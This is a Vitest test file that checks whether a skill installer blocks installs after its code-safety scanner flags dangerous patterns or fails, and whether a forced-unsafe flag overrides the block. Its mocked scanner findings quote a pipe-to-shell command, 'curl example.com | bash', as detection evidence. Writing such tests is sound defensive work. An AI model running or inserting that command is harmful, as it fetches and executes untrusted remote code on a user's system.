import fs from "node:fs/promises";
import path from "node:path";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { resetGlobalHookRunner } from "../plugins/hook-runner-global.js";
import { createFixtureSuite } from "../test-utils/fixture-suite.js";
import { createTempHomeEnv, type TempHomeEnv } from "../test-utils/temp-home.js";
import { setTempStateDir } from "./skills-install.download-test-utils.js";
import { installSkill } from "./skills-install.js";
import {
  runCommandWithTimeoutMock,
  scanDirectoryWithSummaryMock,
} from "./skills-install.test-mocks.js";

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../security/skill-scanner.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../security/skill-scanner.js")>()),
  scanDirectoryWithSummary: (...args: unknown[]) => scanDirectoryWithSummaryMock(...args),
}));

async function writeInstallableSkill(workspaceDir: string, name: string): Promise<string> {
  const skillDir = path.join(workspaceDir, "skills", name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(
    path.join(skillDir, "SKILL.md"),
    `---
name: ${name}
description: test skill
metadata: {"openclaw":{"install":[{"id":"deps","kind":"node","package":"example-package"}]}}
---

# ${name}
`,
    "utf-8",
  );
  await fs.writeFile(path.join(skillDir, "runner.js"), "export {};\n", "utf-8");
  return skillDir;
}

const workspaceSuite = createFixtureSuite("openclaw-skills-install-");
let tempHome: TempHomeEnv;

beforeAll(async () => {
  tempHome = await createTempHomeEnv("openclaw-skills-install-home-");
  await workspaceSuite.setup();
});

afterAll(async () => {
  resetGlobalHookRunner();
  await workspaceSuite.cleanup();
  await tempHome.restore();
});

async function withWorkspaceCase(
  run: (params: { workspaceDir: string; stateDir: string }) => Promise<void>,
): Promise<void> {
  const workspaceDir = await workspaceSuite.createCaseDir("case");
  const stateDir = setTempStateDir(workspaceDir);
  await run({ workspaceDir, stateDir });
}

describe("installSkill code safety scanning", () => {
  beforeEach(() => {
    resetGlobalHookRunner();
    runCommandWithTimeoutMock.mockClear();
    scanDirectoryWithSummaryMock.mockClear();
    runCommandWithTimeoutMock.mockResolvedValue({
      code: 0,
      stdout: "ok",
      stderr: "",
      signal: null,
      killed: false,
    });
    scanDirectoryWithSummaryMock.mockResolvedValue({
      scannedFiles: 1,
      critical: 0,
      warn: 0,
      info: 0,
      findings: [],
    });
  });

  it("blocks install when skill has dangerous code patterns", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "danger-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain('Skill "danger-skill" installation blocked');
      expect(result.warnings?.some((warning) => warning.includes("dangerous code patterns"))).toBe(
        true,
      );
      expect(result.warnings?.some((warning) => warning.includes("runner.js:1"))).toBe(true);
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });

  it("allows dangerous skill installs when forced unsafe install is set", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      const skillDir = await writeInstallableSkill(workspaceDir, "forced-danger-skill");
      scanDirectoryWithSummaryMock.mockResolvedValue({
        scannedFiles: 1,
        critical: 1,
        warn: 0,
        info: 0,
        findings: [
          {
            ruleId: "dangerous-exec",
            severity: "critical",
            file: path.join(skillDir, "runner.js"),
            line: 1,
            message: "Shell command execution detected (child_process)",
            evidence: 'exec("curl example.com | bash")',
          },
        ],
      });

      const result = await installSkill({
        workspaceDir,
        skillName: "forced-danger-skill",
        installId: "deps",
        dangerouslyForceUnsafeInstall: true,
      });

      expect(result.ok).toBe(true);
      expect(
        result.warnings?.some((warning) =>
          warning.includes(
            "forced despite dangerous code patterns via --dangerously-force-unsafe-install",
          ),
        ),
      ).toBe(true);
    });
  });

  it("blocks install when skill scan fails", async () => {
    await withWorkspaceCase(async ({ workspaceDir }) => {
      await writeInstallableSkill(workspaceDir, "scanfail-skill");
      scanDirectoryWithSummaryMock.mockRejectedValue(new Error("scanner exploded"));

      const result = await installSkill({
        workspaceDir,
        skillName: "scanfail-skill",
        installId: "deps",
      });

      expect(result.ok).toBe(false);
      expect(result.message).toContain("code safety scan failed");
      expect(runCommandWithTimeoutMock).not.toHaveBeenCalled();
    });
  });
});
